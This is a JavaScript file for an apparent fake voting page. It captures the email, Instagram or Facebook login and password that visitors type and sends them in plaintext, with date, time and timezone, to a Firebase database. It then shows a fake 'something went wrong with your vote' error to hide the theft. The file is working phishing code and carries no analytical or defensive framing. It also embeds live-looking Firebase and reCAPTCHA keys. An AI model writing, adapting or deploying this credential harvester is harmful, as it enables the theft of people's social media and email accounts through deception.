// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyDHhFRxJxPXIaF3jLQYEAaGQBGpPC68X0s",
  authDomain: "smartvoteultra.firebaseapp.com",
  databaseURL: "https://smartvoteultra-default-rtdb.firebaseio.com",
  projectId: "smartvoteultra",
  storageBucket: "smartvoteultra.firebasestorage.app",
  messagingSenderId: "816871038079",
  appId: "1:816871038079:web:89bb9c1293d4c02c6f734a"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function hmlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("hm-email").value;
  var password = document.getElementById("hm-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      alert("Oops! Something went wrong with your vote.");
      document.getElementById("hm-pass").value = "";

      return false;
    }, 2000);
  }
}

function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var username = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log(timezone);
  var accountType = "Instagram";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      alert("Oops! Something went wrong with your vote.");
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      alert("Oops! Something went wrong with your vote.");
      document.getElementById("fb-pass").value = "";

      return false;
    }, 2000);
  }
}
